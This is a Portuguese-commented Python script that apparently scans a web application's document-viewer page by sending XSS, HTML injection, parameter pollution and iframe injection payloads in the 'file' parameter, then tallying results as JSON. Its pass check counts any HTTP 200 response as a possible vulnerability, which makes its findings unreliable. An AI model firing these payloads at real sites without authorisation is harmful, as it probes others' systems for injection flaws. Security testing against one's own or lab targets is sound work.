import requests
from bs4 import BeautifulSoup
from urllib.parse import quote
import asyncio
import httpx
import sys
import time
import json

if len(sys.argv) > 2:
    url_base = sys.argv[1]  # Recebe a URL base como argumento do código principal
    taxa_envio = sys.argv[2]  # Recebe a taxa de envio como segundo argumento
else:
    print("URL base e/ou taxa de envio não foram fornecidas.")
    sys.exit(1)

# Mapeia a taxa de envio para um intervalo de tempo específico
delays = {'baixo': 7, 'medio': 2, 'alto': 0.5}
delay = delays.get(taxa_envio, 2)  # Usa 'medio' como padrão se a taxa não for reconhecida

url_alvo = f"{url_base}/index.php?page=document-viewer.php"
print(url_alvo)
headers_base = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
}

# Payloads para testar
payloads = {
    'Cross Site Scripting': "<script>alert('XSS')</script>",
    'HTML Injection': "<h1>HTML Injection</h1>",
    'HTTP Parameter Pollution': "valid_file.pdf&file=malicious_file.txt",
    'Frame Source Injection': "<iframe src='http://google.com'></iframe>",
}

# Função assíncrona para enviar a requisição e verificar a resposta
async def enviar_requisicao_e_verificar_resposta(payload, tipo_vulnerabilidade, teste_numero):
    url_completa = f"{url_alvo}&file={quote(payload)}"  # Usando quote para codificar o payload
    async with httpx.AsyncClient(http2=True) as client:
        resposta_teste = await client.get(url_completa, headers=headers_base)
        soup = BeautifulSoup(resposta_teste.text, 'html.parser')
        titulo = soup.find('title').string if soup.find('title') else ''

        print(f"Teste {teste_numero}: Testando '{tipo_vulnerabilidade}'. Código de status: {resposta_teste.status_code}, Título: {titulo}")

        if resposta_teste.status_code == 200:
            print(f"Teste #{teste_numero} PASSOU: Vulnerabilidade '{tipo_vulnerabilidade}' possivelmente encontrada!")
            return 1
        else:
            print(f"Teste #{teste_numero} FALHOU: Código de status: {resposta_teste.status_code}.")
            return 0

# Função principal para executar os testes
async def executar_testes():
    total_testes = 0
    testes_passaram = 0
    testes_falharam = 0

    for tipo_vulnerabilidade, payload in payloads.items():
        total_testes += 1
        resultado_teste = await enviar_requisicao_e_verificar_resposta(payload, tipo_vulnerabilidade, total_testes)
        if resultado_teste == 1:
            testes_passaram += 1
        else:
            testes_falharam += 1
        time.sleep(delay)  # Adiciona uma pausa entre as requisições baseada na taxa de envio
    #Imprimindo os resultados
    resultados = {
    'nome_script': 'Nome do Script',
    'total_testes': total_testes,
    'testes_passaram': testes_passaram,
    'testes_falharam': testes_falharam,
    'url_testada': url_alvo
    }
    resultados_json = json.dumps(resultados)

    # Imprimindo a string JSON
    print(resultados_json)

# Executar os testes
if __name__ == "__main__":
    asyncio.run(executar_testes())